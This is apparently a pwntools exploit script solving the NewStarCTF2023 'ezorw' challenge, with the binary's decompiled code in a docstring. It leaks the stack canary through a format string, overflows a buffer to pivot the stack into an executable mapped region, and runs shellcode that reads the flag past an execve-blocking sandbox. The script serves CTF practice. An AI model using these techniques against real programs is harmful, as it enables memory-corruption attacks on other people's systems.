"""NewStarCTF2023 Week3 orw&rop
禁用了 execve

  char buf[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  sandbox();
  mmap((void *)0x66660000, 0x1000uLL, 7, 50, -1, 0LL);
  puts("Try to escape the sandbox");
  read(0, buf, 0x20uLL);
  printf(buf);
  puts("I think you can get flag now");
  read(0, buf, 0x100uLL);
  return 0;

"""
from pwn import *

binary = './ezorw'

elf = ELF(binary)
context(log_level='debug', arch=elf.arch, os='linux', binary=binary)

s = remote('node4.buuoj.cn', 26422)
s.sendafter('sandbox\n', '%44$p%11$p')
stack = int(s.recv(14), 16)
canary = int(s.recv(18), 16)
success(f'canary: 0x{canary:x}')

door = 0x66660000
fake_rbp = door + 0x30 # buf = rbp - 0x30, 这样正好写入 door
ret = 0x0000401382  # 栈迁移后重新 read 写入 0x66660000 

s.sendafter('flag now', flat('a' * 0x28, canary, fake_rbp, ret))

sc_cat_flag = asm(shellcraft.cat('./flag'))  # 0x38 有点大,canary之前只够0x28,要写到后面再ret, ('\x00' * 0x28, canary, 0, door + 0x40) 一共 0x40个大小,直接执行后面的sc
s.sendline(flat('\x00' * 0x28, canary, 0, door + 0x40, sc_cat_flag))

s.interactive()
